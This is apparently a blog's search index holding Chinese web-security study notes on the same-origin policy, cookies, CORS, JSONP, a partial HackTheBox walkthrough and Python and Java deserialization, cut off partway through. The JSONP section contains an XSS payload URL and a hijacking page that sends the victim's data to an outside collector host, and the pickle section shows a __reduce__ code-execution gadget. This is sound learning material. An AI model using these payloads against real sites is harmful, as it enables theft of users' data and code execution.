<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>browserorigin</title>
      <link href="/2024/09/20/WebSecurity/browserorigin/"/>
      <url>/2024/09/20/WebSecurity/browserorigin/</url>
      
        <content type="html"><![CDATA[<p>写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。<br>在这一背景下想要系统整理一下相关的知识<br>参考博客：<a href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>找到2017年的一篇论文：Same-Origin Policy: Evaluation in Modern Browsers，发在顶会上的</p><p>个人理解的域和源本质上是一样的，只是域是针对单个的，而有源就要有汇，是针对双方的。在浏览器的上下文中，域（Domain） 是一种安全模型的基础构件，主要用来确定哪些网络资源（如网页、图片、脚本等）可以与哪些其他资源互相交互。而域的概念是为了实现 Web 安全而设计的，主要目的是防止恶意网站访问或操作其他网站的数据，这种安全策略被称为同源政策（Same-Origin Policy, SOP）（是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。）</p><img src="/2024/09/20/WebSecurity/browserorigin/image.png" class=""><p>浏览器的同源策略：对于Web页面上的脚本来说，只能访问来自同一来源的数据，而不能访问或修改不同来源的数据。这里的“来源”（origin）是由协议（protocol）、域名（domain）和端口（port）三个部分组成的。只有当这三者完全相同的时候，两个资源才被认为是“同源”的。<br>虽然浏览器为了安全目的引入了同源政策，但同时也给开发者们带来很多问题，这也催生出了很多的跨域手段，带来了新的攻击面。</p><p>①.<a href="https://blog.csdn.net/bestxianfeng163/article/details/105666140">浏览器</a>先根据同源策略对前端页面和后台交互地址做匹配，若同源，则直接发送数据请求；若不同源，则发送跨域请求。<br>②.服务器解析程序收到浏览器跨域请求后，根据自身配置返回对应文件头。若未配置过任何允许跨域，则文件头里不包含Access-Control-Allow-origin字段，若配置过域名，则返回Access-Control-Allow-origin+ 对应配置规则里的域名的方式。<br>③.浏览器根据接受到的http文件头里的Access-Control-Allow-origin字段做匹配，若无该字段，说明不允许跨域；若有该字段，则对字段内容和当前域名做比对，如果同源，则说明可以跨域，浏览器发送该请求；若不同源，则说明该域名不可跨域，不发送请求</p><h1 id="Cookie的跨域问题"><a href="#Cookie的跨域问题" class="headerlink" title="Cookie的跨域问题"></a>Cookie的跨域问题</h1><p>在Cookie设置中有很多<a href="https://blog.csdn.net/qq_51383106/article/details/131458419">属性</a></p><table><thead><tr><th>名称</th><th>Cookie的name</th></tr></thead><tbody><tr><td>值</td><td>Cookie的value</td></tr><tr><td>Domain</td><td>Cookie的域。如果设成 xxx.com(一级域名)，那么子域名x.xxx.com(二级域名)，都可以使用xxx.com的Cookie</td></tr><tr><td>Path</td><td>Cookie的路径。如果设为&#x2F;，则同域名全部路径均可使用该Cookie。如果设为&#x2F;xxx&#x2F;，则只有路径为&#x2F;xxx&#x2F;可以使用该Cookie。</td></tr><tr><td>Expires &#x2F; Max-Age</td><td>Cookie的超时时间。如果值为时间，则在到达指定时间后Cookie失效。如果值为Session(会话)，Cookie会同Session一起失效，当整个浏览器关闭的时候Cookie失效。</td></tr><tr><td>Size</td><td>Cookie的大小。</td></tr><tr><td>HttpOnly</td><td>值为true时，Cookie只会在Http请求头中存在，不能通过doucment.cookie(JavaScript)访问Cookie。</td></tr><tr><td>Secure</td><td>值为true时，只能通过https来传输Cookie。</td></tr><tr><td>SameSite</td><td>值为Strict，完全禁止第三方Cookie，跨站时无法使用Cookie。值为Lax，允许在跨站时使用Get请求携带Cookie，下面有一个表格介绍Lax的Cookie使用情况。值为None，允许跨站跨域使用Cookie，前提是将Secure属性设置为true。Priority ：Cookie的优先级。值为Low&#x2F;Medium&#x2F;High，当Cookie数量超出时，低优先级的Cookie会被优先清除。</td></tr></tbody></table><p>针对上面的属性，如果设置不当，就有可能存在安全问题：<br>上面的Cookie配置中涉及到安全性的属性主要包括Domain、Path、HttpOnly、Secure和SameSite。每个属性的设置都会直接影响到Cookie的安全性和应用的安全风险。下面分别分析这些属性可能引起的安全问题：</p><ol><li>Domain（域）：如果Domain设置不当，比如设置为一级域名（例如<code>xxx.com</code>），那么所有xxx.com的子域（如<code>sub.xxx.com</code>）都可以访问这个Cookie。这可能会导致Cookie被不安全的子域访问，增加数据泄露的风险。依据最小特权原则，尽量将cookie作用域设置的越小越好。</li><li>Path（路径）：如果Path设置为根路径（<code>/</code>），则整个网站的所有页面都能访问这个Cookie。如果某些路径下的页面存在安全漏洞，那么这些页面也能访问到Cookie，存在被利用的风险。</li><li>HttpOnly：如果HttpOnly属性未被设置（即默认情况下或设置为false），Cookie可以通过客户端脚本，如JavaScript的<code>document.cookie</code>访问。</li><li>Secure：如果Secure属性未设置，Cookie可以通过不安全的HTTP连接传输。</li><li>SameSite</li></ol><ul><li><strong>Strict</strong>：严格的设置可能会导致合法的跨站请求场景（例如，用户从其他网站点击链接跳转到站点时）下Cookie不被发送，影响用户体验。</li><li><strong>Lax</strong>：相对宽松，但在某些情况下（如POST请求等）仍不发送Cookie，可能影响功能的实现。</li><li><strong>None</strong>：如果没有正确设置Secure属性，设置SameSite为None时可能导致Cookie在跨站请求中被发送，增加CSRF攻击的风险。</li></ul><p><a href="https://blog.csdn.net/dingtao_237/article/details/103007697">子父域问题</a>：子域可以获取到父域的cookie，反之则不行。所以我们在种全站cookie的时候（比如登录状态），都会种到全站域名的父域上，这样全站可以共享登录状态。当然这里说的全站域名都是一个父域的情况。</p><h1 id="CORS（跨源资源共享）"><a href="#CORS（跨源资源共享）" class="headerlink" title="CORS（跨源资源共享）"></a>CORS（跨源资源共享）</h1><p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>CORS（Cross-Origin Resource Sharing，跨源资源共享）是一个允许在网页脚本中访问不同源服务器资源的安全功能。它是一个 W3C 标准，旨在克服浏览器同源政策对资源跨域访问的限制。</p><h2 id="CORS-的工作原理"><a href="#CORS-的工作原理" class="headerlink" title="CORS 的工作原理"></a>CORS 的工作原理</h2><img src="/2024/09/20/WebSecurity/browserorigin/image-1.png" class=""><p>CORS 通过添加一系列新的 HTTP 头部来扩展已有的 HTTP 协议，使得服务器能够声明哪些源站可以访问该服务器上的资源。在 CORS 中，HTTP 请求由两种类型：</p><ol><li><p><strong>简单请求（Simple Requests）</strong>：</p><ul><li>使用 GET、HEAD 或 POST 方法。</li><li>POST 方法的 <code>Content-Type</code> 仅限于 <code>text/plain</code>、<code>multipart/form-data</code> 和 <code>application/x-www-form-urlencoded</code>。</li><li>不会改变服务器状态的请求被视为简单请求。</li></ul><p>简单请求的 CORS 流程：</p><ul><li>浏览器在简单请求的头部中自动添加 <code>Origin</code> 字段，这个字段标明请求来自哪个源（协议+域名+端口）。</li><li>服务器根据这个源决定是否允许请求。如果允许，服务器会在响应头中添加 <code>Access-Control-Allow-Origin</code>。浏览器只有在收到这个头部，并且值与请求的源相匹配，或者是通配符 <code>*</code> 时，才会处理响应。如果不允许，服务器不会添加该字段，浏览器也会阻止应用访问该响应。</li></ul></li><li><p><strong>预检请求（Preflight Requests）</strong>：</p><ul><li>使用了除 GET、HEAD、POST 之外的 HTTP 方法。</li><li>发送了除简单请求头之外的自定义头，如 <code>application/json</code>。</li><li>对服务器有特定影响的 POST 请求（如发送 JSON 或 XML 数据）。</li></ul><p>预检请求的 CORS 流程：</p><ul><li>在发送实际请求前，浏览器首先会发送一个 OPTIONS 请求到服务器，询问服务器是否允许跨域请求。</li><li>这个 OPTIONS 预检请求包括以下头信息：<code>Origin</code>、<code>Access-Control-Request-Method</code>（实际请求中将使用的 HTTP 方法）和 <code>Access-Control-Request-Headers</code>（实际请求中将设置的自定义头信息）。</li><li>如果服务器允许，它会在响应中包括如 <code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>、<code>Access-Control-Allow-Origin</code> 等头部，明确允许的方法、头部和源。</li><li>浏览器接收到允许的响应后，会发送实际的 HTTP 请求。</li></ul></li></ol><h2 id="CORS-响应头部"><a href="#CORS-响应头部" class="headerlink" title="CORS 响应头部"></a>CORS 响应头部</h2><ul><li>**<code>Access-Control-Allow-Origin</code>**：指定哪些域可以访问域资源。例如，如果requester.com 想要访问 provider.com 的资源，那么开发人员可以使用此标头安全地授予 requester.com 对 provider.com 资源的访问权限。</li><li>**<code>Access-Control-Allow-Methods</code>**：指定可以使用哪些 HTTP 请求方法（GET，PUT，DELETE 等）来访问资源。此标头允许开发人员通过在 requester.com 请求访问provider.com 的资源时，指定哪些方法有效来进一步增强安全性。</li><li>**<code>Access-Control-Allow-Headers</code>**：允许的 HTTP 请求头。</li><li>**<code>Access-Control-Allow-Credentials</code>**：指定浏览器是否将使用请求发送 cookie。仅当 allow-credentials 标头设置为 true 时，才会发送 Cookie。</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">使用场景</a></h2><p>CORS 非常适用于单页应用（SPA），这些应用通常会从多个源加载资源。CORS 也是实现 API 服务和前端分离的关键技术之一，使得前端应用可以安全地从不同源获取数据和资源。<br>SpringCloud设置跨域</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayCorsConfiguation</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsFilter <span class="title function_">corsFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化cors配置对象</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>); <span class="comment">// 允许使用cookie，但是使用cookie是addAllowedOrigin必须是具体的地址，不能是*</span></span><br><span class="line"><span class="comment">//        configuration.addAllowedOrigin(&quot;*&quot;);</span></span><br><span class="line">        configuration.addAllowedOrigin(<span class="string">&quot;http://manage.leyou.com&quot;</span>);</span><br><span class="line">        configuration.addAllowedMethod(<span class="string">&quot;*&quot;</span>);  <span class="comment">//允许的请求方式,get,put,post,delete</span></span><br><span class="line">        configuration.addAllowedHeader(<span class="string">&quot;*&quot;</span>);<span class="comment">//允许的头信息</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//初始化cors的源对象配置</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">corsConfigurationSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        corsConfigurationSource.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>,configuration);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//3.返回新的CorsFilter.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CorsFilter</span>(corsConfigurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><ul><li>CORS 政策完全由服务器端控制。如果服务器配置不当，可能会导致敏感信息泄露。</li><li><code>Access-Control-Allow-Origin</code> 设置为 <code>*</code> 可以允许所有域名的访问，但这通常不推荐用于处理敏感数据。<br>可以使用这个工具做一些检测 <a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li></ul><h1 id="JSONP（JSON-with-Padding）"><a href="#JSONP（JSON-with-Padding）" class="headerlink" title="JSONP（JSON with Padding）"></a>JSONP（JSON with Padding）</h1><p>JSONP 教程   <a href="https://www.runoob.com/json/json-jsonp.html">https://www.runoob.com/json/json-jsonp.html</a></p><img src="/2024/09/20/WebSecurity/browserorigin/image-2.png" class=""><p>JSONP（JSON with Padding）是一种跨域数据交换的技术，它利用了<code>&lt;script&gt;</code>标签没有跨域限制的特性来发送跨域请求，现在的应用很少。<code>callback</code>是一个很有效的关键词，通过在网络请求中检索callback，或许可以找到应用的点，如果返回的json是隐私相关的信息，那么就可以实现信息泄漏等。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>JSONP 的工作原理基于以下两个事实：</p><ol><li>浏览器的同源策略阻止了从不同源加载的脚本访问其他源的 DOM 和 JavaScript 对象，但不禁止向其他源发送<code>&lt;script&gt;</code>标签的请求。</li><li><code>&lt;script&gt;</code>标签的<code>src</code>属性可以用来加载任何来源的 JavaScript 文件。</li></ol><p>当需要从其他域名获取数据时，可以使用 JSONP 方法。这种方式通常涉及到下面几个步骤：</p><ol><li><strong>客户端定义回调函数</strong>：首先在客户端定义一个回调函数，这个函数将处理从服务器获取的数据。</li><li><strong>动态创建 <code>&lt;script&gt;</code> 标签</strong>：然后通过动态创建 <code>&lt;script&gt;</code> 标签的方式来发送请求，请求的 URL 包含一个查询参数，通常是 <code>callback</code>，其值是上一步定义的回调函数的名称。</li><li><strong>服务器响应</strong>：服务器在接收到请求后，会生成 JSON 数据，并将这个数据作为参数传递给查询参数中指定的回调函数，形成一段可执行的 JavaScript 代码。</li><li><strong>执行响应</strong>：当这段带有数据的 JavaScript 代码通过 <code>&lt;script&gt;</code> 标签加载并执行时，定义的回调函数会被调用，并且实际的数据会作为参数传入。</li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设有一个客户端回调函数 <code>handleResponse</code>，你希望从 <code>http://example.com/api</code> 获取数据，你可以这样实现 JSONP 请求：<br><strong>客户端代码</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data: &quot;</span> + data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://example.com/api?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><p><strong>服务器端响应</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);</span><br></pre></td></tr></table></figure><p>这段响应是一个 JavaScript 代码，调用了客户端定义的 <code>handleResponse</code> 函数，并传入了数据。</p><h3 id="安全考虑"><a href="#安全考虑" class="headerlink" title="安全考虑"></a>安全考虑</h3><p>1、对于输入的callback函数名过滤不严格，导致输入的数据直接输出到前端造成XSS<br>2、JSONP劫持漏洞，由于对于来源域没有严格限制，因此来源于不安全的域的请求也会被响应<br>随着 CORS（跨源资源共享）标准的普及，JSONP 的使用越来越少。CORS 提供了一种更安全、更灵活的跨域请求方式，允许服务器更精细地控制哪些网站可以访问哪些资源，同时支持所有类型的 HTTP 请求（不仅仅是 GET 请求），而 JSONP 仅支持 GET 请求。因此，在现代 Web 应用开发中，推荐使用 CORS 而不是 JSONP。</p><p>直接构造xss：<code>http://xxxxxx/jsonp/index.php?callback=jsonp_5981%3Cimg%20src=x%20onerror=alert(/xss/)%3E</code>，可以获取到用户的cookie信息或者劫持用户跳转到钓鱼网站<br>JSONP劫持：JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;jsonp劫持&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> h=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        a=key+<span class="string">&#x27; : &#x27;</span>+v[key]+<span class="string">&#x27; ,&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        h+=a</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(h);</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">get</span>(<span class="string">&#x27;http://jsonp1.kijkv0.ceye.io?value=&#x27;</span>+h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.31.149/jsonp/index.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一旦被攻击者访问该网页，就会自动触发，会自动访问具有漏洞的jsonp接口，利用被攻击者自己的session获取到被攻击者的信息，并将该信息远程发送到攻击者的服务器上</p><h1 id="其他解决跨域问题的方案"><a href="#其他解决跨域问题的方案" class="headerlink" title="其他解决跨域问题的方案"></a><a href="https://blog.csdn.net/qq_51383106/article/details/131458419">其他解决跨域问题的方案</a></h1><p>利用nginx进行反向代理，在一个服务器上配置多个前缀来转发http&#x2F;https请求到多个真实的服务器即可。在 nginx 中配置反向代理服务器，将客户端的请求转发到后端服务器，并在转发过程中添加相应的响应头。例如，假设前端服务器运行在 <a href="http://frontend.example.com,后端服务器运行在/">http://frontend.example.com，后端服务器运行在</a> <a href="http://backend.example.com,则可以在/">http://backend.example.com，则可以在</a> nginx 中配置如下的反向代理服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name frontend.example.com;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://backend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Origin http://frontend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置中，location &#x2F;api 将客户端请求中的 &#x2F;api 转发到后端服务器的对应接口。<br>add_header Access-Control-Allow-Origin <a href="http://frontend.example.com/">http://frontend.example.com</a> 表示允许来自 <a href="http://frontend.example.com/">http://frontend.example.com</a> 的跨域请求。<br>add_header Access-Control-Allow-Credentials true 表示允许跨域请求携带 cookie。<br>设置相应的响应头在响应头中添加相应的跨域设置，以允许客户端发送跨域请求和携带 cookie。例如，添加 Access-Control-Allow-Origin 和 Access-Control-Allow-Credentials 头部：Access-Control-Allow-Origin: <a href="http://frontend.example.com/">http://frontend.example.com</a><br>Access-Control-Allow-Credentials: true这样客户端在向后端服务器发送请求时，就能携带 cookie，并允许跨域请求。</p><p>还有很多前端跨域解决方案：<a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hackthebox】解题记录</title>
      <link href="/2024/09/19/WebSecurity/hackthebox/"/>
      <url>/2024/09/19/WebSecurity/hackthebox/</url>
      
        <content type="html"><![CDATA[<h1 id="Sightless"><a href="#Sightless" class="headerlink" title="Sightless"></a>Sightless</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先用nmap扫描一下：<code>nmap -sC -sV 10.10.11.32 -T4 -oN nmap.txt</code></p><img src="/2024/09/19/WebSecurity/hackthebox/image.png" class="" title="端口开放"><p>发现有web服务，访问web页面。另外存在ftp和ssh服务，这些都可能是后面的突破点，先看下web服务。</p><img src="/2024/09/19/WebSecurity/hackthebox/image-1.png" class="" title="Unknown host"><p>需要修改下host文件了，添加一行 <code>10.10.11.32 sightless.htb</code><br>访问<code>http://sightless.htb</code><br>页面中只有一个SQLPad是有用的，我们访问这个页面（仍然需要修改host文件）</p><img src="/2024/09/19/WebSecurity/hackthebox/image-2.png" class="" title="SQLPad"><p>首先想到的是SQLPad应该是会有一些CVE在的，百度搜一下发现有个</p><img src="/2024/09/19/WebSecurity/hackthebox/image-3.png" class="" title="CVE"><p>刚好和当前的版本是一致的</p><p>太寄了，不知道为什么国内的服务器一直不能反弹回shell，先放个链接吧<br><a href="https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b">https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b</a></p><p>利用callback方法寻找不遵守同源策略的url<br>cors_scan</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第三部分 Python反序列化分析</title>
      <link href="/2024/09/18/WebSecurity/pythondeserialization-md/"/>
      <url>/2024/09/18/WebSecurity/pythondeserialization-md/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Python的序列化和PHP的很像</p><p>Python序列化相关函数：<br>pickle.dump(obj, file) : 将对象序列化后保存到文件<br>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流<br>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><p>同样，在Python中也存在魔术方法：<br><code>__reduce__()</code>反序列化时调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><p><code>__init__</code> 本质就是python中的构造函数，在对象被实例化时调用<br><code>__reduce_ex__()</code> 反序列化时调用<br><code>__setstate__()</code> 反序列化时调用<br><code>__getstate__()</code> 序列化时调用</p><p>Python代码审计工具 bandit</p><h1 id="CVE分析"><a href="#CVE分析" class="headerlink" title="CVE分析"></a>CVE分析</h1><h2 id="CVE-2019-6446-Numpy反序列化命令执行"><a href="#CVE-2019-6446-Numpy反序列化命令执行" class="headerlink" title="CVE-2019-6446 Numpy反序列化命令执行"></a>CVE-2019-6446 Numpy反序列化命令执行</h2><p><a href="https://www.freebuf.com/vuls/194540.html">https://www.freebuf.com/vuls/194540.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第二部分 Java反序列化分析</title>
      <link href="/2024/09/12/WebSecurity/javadeserialization/"/>
      <url>/2024/09/12/WebSecurity/javadeserialization/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1590955">参考</a><br><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>其实和PHP的反序列化差不多，本来想写在一起的还是分开了,Java和PHP最大的不同我感觉就是利用的触发方式，PHP因为有魔术方法所以更多（虽然但是Java也有反射）。<br>HTTP：多平台之间的通信，管理等<br>RMI：是Java的一组拥护开发分布式应用程序的API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口。<br>JMX：JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理,中间件软件WebLogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</p><p>只有实现了Serializable接口的类的对象才可以被序列化，Serializable 接口是启用其序列化功能的接口。</p><p>Java接口： Serializable Externalizable 接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject 等</p><p>Java反序列化后的数据会有一些特征，这在黑盒测试中很有用：<br>以 rO0AB 开头，可以确定这串就是 JAVA 序列化 base64 加密的数据（Java 序列化协议的二进制标识符 aced 0005，是 Java 序列化协议的固定魔术头）<br>或者如果以 aced 开头，那么则可能是 java 序列化的 16 进制。</p><p>可能会出现的地方：http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><p>利用工具：<a 